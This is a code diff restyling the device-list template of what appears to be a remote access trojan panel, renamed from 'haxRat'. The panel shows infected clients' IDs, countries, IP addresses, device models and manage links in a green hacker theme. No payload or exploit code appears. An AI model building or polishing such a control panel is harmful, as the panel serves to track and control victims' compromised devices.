@@ -9,7 +9,7 @@
     <script>
         gtag('event', 'screen_view', {
             'screen_name': 'devices',
-            'app_name': 'haxRat'
+            'app_name': 'OsamaAli'
         });
 
         gtag('event', 'devicecount', {
@@ -18,21 +18,24 @@
         });
 
     </script>
-    <div class="ui container">
+    <div class="crt-scanlines"></div>
+    <div class="ui container" style="font-family: 'Fira Code', 'Courier New', Courier, monospace !important;">
         <% include partials/header.ejs %>
-        <div class="ui black inverted segment">
+        <div class="ui black inverted segment" style="border: 2px solid #00ff41 !important;">
 
-            <h3 class="ui green dividing header">Online</h3>
+            <h3 class="ui dividing header" style="color:#00ff41 !important; border-bottom: 2px solid #00ff41 !important; text-shadow: 0 0 10px #00ff41; font-weight: bold;">
+                ──▶ ONLINE [●]
+            </h3>
 
-            <table class="ui inverted orange celled table">
+            <table class="ui inverted celled table" style="border: 1px solid #00ff41 !important; background-color:#111 !important;">
                 <thead>
                     <tr>
-                        <th>Name</th>
-                        <th>Country</th>
-                        <th>IP</th>
-                        <th>Device</th>
-                        <th>Last Seen</th>
-                        <th>Manage</th>
+                        <th style="color:#00ff41 !important;">Name</th>
+                        <th style="color:#00ff41 !important;">Country</th>
+                        <th style="color:#00ff41 !important;">IP</th>
+                        <th style="color:#00ff41 !important;">Device</th>
+                        <th style="color:#00ff41 !important;">Last Seen</th>
+                        <th style="color:#00ff41 !important;">Manage</th>
                     </tr>
                 </thead>
                 <tbody>
@@ -44,13 +47,15 @@
                        deviceStr += (item.dynamicData.device.model !== undefined) ? ' (' + item.dynamicData.device.model + ')' :  ''; 
                        %>
                     <tr>
-                        <td class="collapsing"><%= item.clientID %></td>
+                        <td class="collapsing" style="color:#00ff41 !important;">
+                            <span class="status-online" style="margin-right: 8px;"></span><%= item.clientID %>
+                        </td>
                         <td class="collapsing"><i class="<%= flagCss %>"></i></td>
-                        <td class="collapsing"><%= item.dynamicData.clientIP %></td>
-                        <td><%= deviceStr %></td>
-                        <td class="collapsing"><%= lsdate.toLocaleString('en-GB', { timeZone: 'UTC' }) %></td>
+                        <td class="collapsing" style="color:#00ff41 !important;"><%= item.dynamicData.clientIP %></td>
+                        <td style="color:#00ff41 !important;"><%= deviceStr %></td>
+                        <td class="collapsing" style="color:#00ff41 !important;"><%= lsdate.toLocaleString('en-GB', { timeZone: 'UTC' }) %></td>
                         <td class="collapsing"><a href="/manage/<%= item.clientID %>/info"
-                                class="ui button blue">Manage</a>
+                                class="ui button">Manage</a>
                         </td>
                     </tr>
                     <% }) %>
@@ -58,16 +63,18 @@
             </table>
 
 
-            <h3 class="ui red dividing header">Offline</h3>
-            <table class="ui inverted orange celled table">
+            <h3 class="ui dividing header" style="color:#ff0033 !important; border-bottom: 2px solid #ff0033 !important; text-shadow: 0 0 10px #ff0033; font-weight: bold; margin-top:2em;">
+                ──▶ OFFLINE [●]
+            </h3>
+            <table class="ui inverted celled table" style="border: 1px solid #ff0033 !important; background-color:#111 !important;">
                 <thead>
                     <tr>
-                        <th>Name</th>
-                        <th>Country</th>
-                        <th>IP</th>
-                        <th>Device</th>
-                        <th>Last Seen</th>
-                        <th>Manage</th>
+                        <th style="color:#ff0033 !important;">Name</th>
+                        <th style="color:#ff0033 !important;">Country</th>
+                        <th style="color:#ff0033 !important;">IP</th>
+                        <th style="color:#ff0033 !important;">Device</th>
+                        <th style="color:#ff0033 !important;">Last Seen</th>
+                        <th style="color:#ff0033 !important;">Manage</th>
                     </tr>
                 </thead>
                 <tbody>
@@ -79,13 +86,15 @@
                        deviceStr += (item.dynamicData.device.model !== undefined) ? ' (' + item.dynamicData.device.model + ')' :  ''; 
                        %>
                     <tr>
-                        <td class="collapsing"><%= item.clientID %></td>
+                        <td class="collapsing" style="color:rgba(0, 255, 65, 0.7) !important;">
+                            <span class="status-offline" style="margin-right: 8px; background-color: #ff0033 !important; box-shadow: none;"></span><%= item.clientID %>
+                        </td>
                         <td class="collapsing"><i class="<%= flagCss %>"></i></td>
-                        <td class="collapsing"><%= item.dynamicData.clientIP %></td>
-                        <td><%= deviceStr %></td>
-                        <td class="collapsing"><%= lsdate.toLocaleString('en-GB', { timeZone: 'UTC' }) %></td>
+                        <td class="collapsing" style="color:rgba(0, 255, 65, 0.7) !important;"><%= item.dynamicData.clientIP %></td>
+                        <td style="color:rgba(0, 255, 65, 0.7) !important;"><%= deviceStr %></td>
+                        <td class="collapsing" style="color:rgba(0, 255, 65, 0.7) !important;"><%= lsdate.toLocaleString('en-GB', { timeZone: 'UTC' }) %></td>
                         <td class="collapsing"><a href="/manage/<%= item.clientID %>/info"
-                                class="ui button blue">Manage</a>
+                                class="ui button">Manage</a>
                         </td>
                     </tr>
                     <% }) %>
